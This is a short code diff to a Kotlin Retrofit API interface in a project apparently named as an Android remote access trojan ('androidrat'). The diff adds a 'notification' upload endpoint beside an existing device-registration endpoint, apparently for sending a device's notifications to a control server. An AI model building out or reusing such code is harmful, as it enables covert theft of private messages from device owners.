@@ -1,6 +1,7 @@
 package com.nqmgaming.androidrat.data
 
 import com.nqmgaming.androidrat.data.dto.DeviceDto
+import com.nqmgaming.androidrat.data.dto.NotificationDto
 import okhttp3.RequestBody
 import okhttp3.ResponseBody
 import retrofit2.Call
@@ -12,4 +13,7 @@ interface ApiService {
     @Streaming
     @POST("register")
     fun register(@Body deviceDto: DeviceDto): Call<ResponseBody>
+
+    @POST("notification")
+    fun postNotification(@Body notificationData: NotificationDto): Call<ResponseBody>
 }
